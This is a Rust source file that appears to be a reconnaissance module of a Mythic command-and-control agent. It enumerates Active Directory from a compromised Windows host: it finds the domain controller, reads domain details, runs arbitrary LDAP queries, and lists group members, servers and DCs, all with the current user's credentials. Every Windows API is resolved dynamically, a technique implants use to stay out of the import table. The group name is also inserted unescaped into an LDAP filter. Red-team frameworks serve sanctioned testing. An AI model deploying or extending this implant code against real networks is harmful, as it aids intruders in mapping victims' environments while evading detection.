use crate::{AgentTask, mythic_error};

#[cfg(target_os = "windows")]
use crate::mythic_success;
use serde::Deserialize;

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
fn from_wide_ptr(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    unsafe {
        let len = (0..).take_while(|&i| *ptr.offset(i) != 0).count();
        let slice = std::slice::from_raw_parts(ptr, len);
        String::from_utf16_lossy(slice)
    }
}

#[derive(Deserialize)]
struct LdapSearchArgs {
    filter: String,
    #[serde(default)]
    base_dn: Option<String>,
    #[serde(default)]
    attributes: Option<String>,
    #[serde(default)]
    server: Option<String>,
}

#[derive(Deserialize)]
struct DomainUsersArgs {
    group: String,
}

#[derive(Deserialize)]
struct DomainComputersArgs {
    filter: String,
}

pub fn ldap_search(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "LDAP search is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let args: LdapSearchArgs = serde_json::from_str(&task.parameters)?;

        // Get DC if server not specified
        let server = if let Some(s) = args.server {
            s
        } else {
            match unsafe { get_domain_controller() } {
                Ok(dc) => dc,
                Err(e) => return Ok(mythic_error!(task.id, format!("Failed to find DC: {}", e))),
            }
        };

        let result = unsafe {
            perform_ldap_search(
                &server,
                args.base_dn.as_deref(),
                &args.filter,
                args.attributes.as_deref(),
            )
        };

        match result {
            Ok(data) => Ok(mythic_success!(task.id, data)),
            Err(e) => Ok(mythic_error!(task.id, format!("LDAP search failed: {}", e))),
        }
    }
}

pub fn domain_info(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "Domain info is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let result = unsafe { get_domain_info() };

        match result {
            Ok(info) => Ok(mythic_success!(task.id, info)),
            Err(e) => Ok(mythic_error!(task.id, format!("Failed to get domain info: {}", e))),
        }
    }
}

pub fn domain_users(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "Domain users query is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let args: DomainUsersArgs = serde_json::from_str(&task.parameters)?;

        // Get DC
        let server = match unsafe { get_domain_controller() } {
            Ok(dc) => dc,
            Err(e) => return Ok(mythic_error!(task.id, format!("Failed to find DC: {}", e))),
        };

        // Query for the group and its members
        let filter = format!("(&(objectClass=group)(cn={}))", args.group);
        let result = unsafe {
            perform_ldap_search(&server, None, &filter, Some("member"))
        };

        match result {
            Ok(data) => Ok(mythic_success!(task.id, data)),
            Err(e) => Ok(mythic_error!(task.id, format!("Failed to query domain users: {}", e))),
        }
    }
}

pub fn domain_computers(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "Domain computers query is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let args: DomainComputersArgs = serde_json::from_str(&task.parameters)?;

        // Get DC
        let server = match unsafe { get_domain_controller() } {
            Ok(dc) => dc,
            Err(e) => return Ok(mythic_error!(task.id, format!("Failed to find DC: {}", e))),
        };

        let filter = match args.filter.as_str() {
            "all" => "(objectClass=computer)",
            "dcs" => "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
            "servers" => "(&(objectClass=computer)(operatingSystem=*server*))",
            _ => {
                return Ok(mythic_error!(
                    task.id,
                    format!("Invalid filter '{}'. Use: all, dcs, or servers", args.filter)
                ));
            }
        };

        let result = unsafe {
            perform_ldap_search(&server, None, filter, Some("name,dNSHostName,operatingSystem"))
        };

        match result {
            Ok(data) => Ok(mythic_success!(task.id, data)),
            Err(e) => Ok(mythic_error!(task.id, format!("Failed to query domain computers: {}", e))),
        }
    }
}

// ============================================================================
// NATIVE LDAP API IMPLEMENTATION
// ============================================================================

#[cfg(target_os = "windows")]
unsafe fn get_domain_controller() -> Result<String, Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    #[repr(C)]
    struct DomainControllerInfoW {
        domain_controller_name: *mut u16,
        domain_controller_address: *mut u16,
        domain_controller_address_type: u32,
        domain_guid: [u8; 16],
        domain_name: *mut u16,
        dns_forest_name: *mut u16,
        flags: u32,
        dc_site_name: *mut u16,
        client_site_name: *mut u16,
    }

    type DsGetDcNameW = unsafe extern "system" fn(
        *const u16,
        *const u16,
        *const u8,
        *const u16,
        u32,
        *mut *mut DomainControllerInfoW,
    ) -> u32;

    type NetApiBufferFree = unsafe extern "system" fn(*mut c_void) -> u32;

    let ds_get_dc = resolve("netapi32.dll", "DsGetDcNameW")
        .ok_or("Failed to resolve DsGetDcNameW")?;
    let ds_get_dc: DsGetDcNameW = std::mem::transmute(ds_get_dc);

    let net_free = resolve("netapi32.dll", "NetApiBufferFree")
        .ok_or("Failed to resolve NetApiBufferFree")?;
    let net_free: NetApiBufferFree = std::mem::transmute(net_free);

    let mut dc_info: *mut DomainControllerInfoW = std::ptr::null_mut();

    let result = ds_get_dc(
        std::ptr::null(),
        std::ptr::null(),
        std::ptr::null(),
        std::ptr::null(),
        0x00000001, // DS_DIRECTORY_SERVICE_REQUIRED
        &mut dc_info,
    );

    if result != 0 || dc_info.is_null() {
        return Err(format!("DsGetDcNameW failed with error: {}", result).into());
    }

    let dc_name = from_wide_ptr((*dc_info).domain_controller_name);
    net_free(dc_info as *mut c_void);

    // Remove leading backslashes if present
    let dc_name = dc_name.trim_start_matches('\\');

    Ok(dc_name.to_string())
}

#[cfg(target_os = "windows")]
unsafe fn get_domain_info() -> Result<String, Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    #[repr(C)]
    struct DomainControllerInfoW {
        domain_controller_name: *mut u16,
        domain_controller_address: *mut u16,
        domain_controller_address_type: u32,
        domain_guid: [u8; 16],
        domain_name: *mut u16,
        dns_forest_name: *mut u16,
        flags: u32,
        dc_site_name: *mut u16,
        client_site_name: *mut u16,
    }

    type DsGetDcNameW = unsafe extern "system" fn(
        *const u16,
        *const u16,
        *const u8,
        *const u16,
        u32,
        *mut *mut DomainControllerInfoW,
    ) -> u32;

    type NetApiBufferFree = unsafe extern "system" fn(*mut c_void) -> u32;
    type NetGetJoinInformation = unsafe extern "system" fn(
        *const u16,
        *mut *mut u16,
        *mut u32,
    ) -> u32;

    let ds_get_dc = resolve("netapi32.dll", "DsGetDcNameW")
        .ok_or("Failed to resolve DsGetDcNameW")?;
    let ds_get_dc: DsGetDcNameW = std::mem::transmute(ds_get_dc);

    let net_free = resolve("netapi32.dll", "NetApiBufferFree")
        .ok_or("Failed to resolve NetApiBufferFree")?;
    let net_free: NetApiBufferFree = std::mem::transmute(net_free);

    let net_get_join = resolve("netapi32.dll", "NetGetJoinInformation")
        .ok_or("Failed to resolve NetGetJoinInformation")?;
    let net_get_join: NetGetJoinInformation = std::mem::transmute(net_get_join);

    let mut result = String::new();

    // Get domain join information
    let mut domain_name: *mut u16 = std::ptr::null_mut();
    let mut join_status: u32 = 0;

    let join_result = net_get_join(std::ptr::null(), &mut domain_name, &mut join_status);

    if join_result == 0 && !domain_name.is_null() {
        result.push_str(&format!("Domain: {}\n", from_wide_ptr(domain_name)));
        result.push_str(&format!("Join Status: {}\n", join_status));
        net_free(domain_name as *mut c_void);
    }

    // Get DC information
    let mut dc_info: *mut DomainControllerInfoW = std::ptr::null_mut();

    let dc_result = ds_get_dc(
        std::ptr::null(),
        std::ptr::null(),
        std::ptr::null(),
        std::ptr::null(),
        0x00000001, // DS_DIRECTORY_SERVICE_REQUIRED
        &mut dc_info,
    );

    if dc_result == 0 && !dc_info.is_null() {
        result.push_str(&format!(
            "Domain Controller: {}\n",
            from_wide_ptr((*dc_info).domain_controller_name).trim_start_matches('\\')
        ));
        result.push_str(&format!(
            "Domain Name: {}\n",
            from_wide_ptr((*dc_info).domain_name)
        ));
        result.push_str(&format!(
            "DNS Forest: {}\n",
            from_wide_ptr((*dc_info).dns_forest_name)
        ));
        net_free(dc_info as *mut c_void);
    }

    if result.is_empty() {
        return Err("Failed to retrieve domain information".into());
    }

    Ok(result)
}

#[cfg(target_os = "windows")]
unsafe fn perform_ldap_search(
    server: &str,
    base_dn: Option<&str>,
    filter: &str,
    attributes: Option<&str>,
) -> Result<String, Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    const LDAP_AUTH_NEGOTIATE: u32 = 0x0486;
    const LDAP_SCOPE_SUBTREE: u32 = 2;

    type LdapInitW = unsafe extern "system" fn(*const u16, u32) -> *mut c_void;
    type LdapBindSW = unsafe extern "system" fn(*mut c_void, *const u16, *const u16, u32) -> u32;
    type LdapSearchSW = unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        u32,
        *const u16,
        *const *const u16,
        u32,
        *mut *mut c_void,
    ) -> u32;
    type LdapFirstEntry = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
    type LdapNextEntry = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
    type LdapGetDn = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut u16;
    type LdapGetValuesW = unsafe extern "system" fn(*mut c_void, *mut c_void, *const u16) -> *mut *mut u16;
    type LdapValueFreeW = unsafe extern "system" fn(*mut *mut u16) -> u32;
    type LdapMemFree = unsafe extern "system" fn(*mut u16) -> ();
    type LdapMsgFree = unsafe extern "system" fn(*mut c_void) -> u32;
    type LdapUnbind = unsafe extern "system" fn(*mut c_void) -> u32;

    let ldap_init = resolve("wldap32.dll", "ldap_initW")
        .ok_or("Failed to resolve ldap_initW")?;
    let ldap_init: LdapInitW = std::mem::transmute(ldap_init);

    let ldap_bind = resolve("wldap32.dll", "ldap_bind_sW")
        .ok_or("Failed to resolve ldap_bind_sW")?;
    let ldap_bind: LdapBindSW = std::mem::transmute(ldap_bind);

    let ldap_search = resolve("wldap32.dll", "ldap_search_sW")
        .ok_or("Failed to resolve ldap_search_sW")?;
    let ldap_search: LdapSearchSW = std::mem::transmute(ldap_search);

    let ldap_first_entry = resolve("wldap32.dll", "ldap_first_entry")
        .ok_or("Failed to resolve ldap_first_entry")?;
    let ldap_first_entry: LdapFirstEntry = std::mem::transmute(ldap_first_entry);

    let ldap_next_entry = resolve("wldap32.dll", "ldap_next_entry")
        .ok_or("Failed to resolve ldap_next_entry")?;
    let ldap_next_entry: LdapNextEntry = std::mem::transmute(ldap_next_entry);

    let ldap_get_dn = resolve("wldap32.dll", "ldap_get_dnW")
        .ok_or("Failed to resolve ldap_get_dnW")?;
    let ldap_get_dn: LdapGetDn = std::mem::transmute(ldap_get_dn);

    let ldap_get_values = resolve("wldap32.dll", "ldap_get_valuesW")
        .ok_or("Failed to resolve ldap_get_valuesW")?;
    let ldap_get_values: LdapGetValuesW = std::mem::transmute(ldap_get_values);

    let ldap_value_free = resolve("wldap32.dll", "ldap_value_freeW")
        .ok_or("Failed to resolve ldap_value_freeW")?;
    let ldap_value_free: LdapValueFreeW = std::mem::transmute(ldap_value_free);

    let ldap_memfree = resolve("wldap32.dll", "ldap_memfreeW")
        .ok_or("Failed to resolve ldap_memfreeW")?;
    let ldap_memfree: LdapMemFree = std::mem::transmute(ldap_memfree);

    let ldap_msg_free = resolve("wldap32.dll", "ldap_msgfree")
        .ok_or("Failed to resolve ldap_msgfree")?;
    let ldap_msg_free: LdapMsgFree = std::mem::transmute(ldap_msg_free);

    let ldap_unbind = resolve("wldap32.dll", "ldap_unbind")
        .ok_or("Failed to resolve ldap_unbind")?;
    let ldap_unbind: LdapUnbind = std::mem::transmute(ldap_unbind);

    // Initialize LDAP connection
    let server_wide = to_wide(server);
    let ldap = ldap_init(server_wide.as_ptr(), 389);

    if ldap.is_null() {
        return Err("ldap_initW failed".into());
    }

    // Bind with current credentials
    let bind_result = ldap_bind(ldap, std::ptr::null(), std::ptr::null(), LDAP_AUTH_NEGOTIATE);

    if bind_result != 0 {
        ldap_unbind(ldap);
        return Err(format!("ldap_bind_sW failed with error: {}", bind_result).into());
    }

    // Determine base DN if not provided
    let base_dn_str = if let Some(base) = base_dn {
        base.to_string()
    } else {
        // Try to get default naming context from rootDSE
        get_default_naming_context(ldap)?
    };

    let base_dn_wide = to_wide(&base_dn_str);
    let filter_wide = to_wide(filter);

    // Parse attributes
    let attrs_vec: Vec<Vec<u16>>;
    let attrs_ptrs: Vec<*const u16>;
    let attrs_ptr: *const *const u16;

    if let Some(attr_str) = attributes {
        attrs_vec = attr_str
            .split(',')
            .map(|a| to_wide(a.trim()))
            .collect();
        attrs_ptrs = attrs_vec.iter().map(|v| v.as_ptr()).collect();
        attrs_ptr = attrs_ptrs.as_ptr();
    } else {
        attrs_ptr = std::ptr::null();
    }

    // Perform search
    let mut search_result: *mut c_void = std::ptr::null_mut();

    let search_res = ldap_search(
        ldap,
        base_dn_wide.as_ptr(),
        LDAP_SCOPE_SUBTREE,
        filter_wide.as_ptr(),
        attrs_ptr,
        0,
        &mut search_result,
    );

    if search_res != 0 {
        ldap_unbind(ldap);
        return Err(format!("ldap_search_sW failed with error: {}", search_res).into());
    }

    // Iterate through results
    let mut results = String::new();
    let mut entry = ldap_first_entry(ldap, search_result);
    let mut count = 0;

    while !entry.is_null() {
        count += 1;

        // Get DN
        let dn_ptr = ldap_get_dn(ldap, entry);
        if !dn_ptr.is_null() {
            results.push_str(&format!("DN: {}\n", from_wide_ptr(dn_ptr)));
            ldap_memfree(dn_ptr);
        }

        // Get attribute values if specified
        if let Some(attr_str) = attributes {
            for attr in attr_str.split(',') {
                let attr_wide = to_wide(attr.trim());
                let values = ldap_get_values(ldap, entry, attr_wide.as_ptr());

                if !values.is_null() {
                    let mut i = 0;
                    while !(*values.offset(i)).is_null() {
                        let value = from_wide_ptr(*values.offset(i));
                        results.push_str(&format!("  {}: {}\n", attr.trim(), value));
                        i += 1;
                    }
                    ldap_value_free(values);
                }
            }
        }

        results.push('\n');
        entry = ldap_next_entry(ldap, entry);
    }

    ldap_msg_free(search_result);
    ldap_unbind(ldap);

    if count == 0 {
        results.push_str("No results found\n");
    } else {
        results.insert_str(0, &format!("Found {} entries:\n\n", count));
    }

    Ok(results)
}

#[cfg(target_os = "windows")]
unsafe fn get_default_naming_context(ldap: *mut c_void) -> Result<String, Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    const LDAP_SCOPE_BASE: u32 = 0;

    type LdapSearchSW = unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        u32,
        *const u16,
        *const *const u16,
        u32,
        *mut *mut c_void,
    ) -> u32;
    type LdapFirstEntry = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
    type LdapGetValuesW = unsafe extern "system" fn(*mut c_void, *mut c_void, *const u16) -> *mut *mut u16;
    type LdapValueFreeW = unsafe extern "system" fn(*mut *mut u16) -> u32;
    type LdapMsgFree = unsafe extern "system" fn(*mut c_void) -> u32;

    let ldap_search = resolve("wldap32.dll", "ldap_search_sW")
        .ok_or("Failed to resolve ldap_search_sW")?;
    let ldap_search: LdapSearchSW = std::mem::transmute(ldap_search);

    let ldap_first_entry = resolve("wldap32.dll", "ldap_first_entry")
        .ok_or("Failed to resolve ldap_first_entry")?;
    let ldap_first_entry: LdapFirstEntry = std::mem::transmute(ldap_first_entry);

    let ldap_get_values = resolve("wldap32.dll", "ldap_get_valuesW")
        .ok_or("Failed to resolve ldap_get_valuesW")?;
    let ldap_get_values: LdapGetValuesW = std::mem::transmute(ldap_get_values);

    let ldap_value_free = resolve("wldap32.dll", "ldap_value_freeW")
        .ok_or("Failed to resolve ldap_value_freeW")?;
    let ldap_value_free: LdapValueFreeW = std::mem::transmute(ldap_value_free);

    let ldap_msg_free = resolve("wldap32.dll", "ldap_msgfree")
        .ok_or("Failed to resolve ldap_msgfree")?;
    let ldap_msg_free: LdapMsgFree = std::mem::transmute(ldap_msg_free);

    let base_dn = to_wide("");
    let filter = to_wide("(objectClass=*)");
    let attr = to_wide("defaultNamingContext");
    let attrs = [attr.as_ptr(), std::ptr::null()];

    let mut search_result: *mut c_void = std::ptr::null_mut();

    let search_res = ldap_search(
        ldap,
        base_dn.as_ptr(),
        LDAP_SCOPE_BASE,
        filter.as_ptr(),
        attrs.as_ptr(),
        0,
        &mut search_result,
    );

    if search_res != 0 {
        return Err("Failed to query rootDSE".into());
    }

    let entry = ldap_first_entry(ldap, search_result);
    if entry.is_null() {
        ldap_msg_free(search_result);
        return Err("No rootDSE entry found".into());
    }

    let attr_name = to_wide("defaultNamingContext");
    let values = ldap_get_values(ldap, entry, attr_name.as_ptr());

    if values.is_null() || (*values).is_null() {
        ldap_msg_free(search_result);
        return Err("defaultNamingContext not found".into());
    }

    let naming_context = from_wide_ptr(*values);

    ldap_value_free(values);
    ldap_msg_free(search_result);

    Ok(naming_context)
}
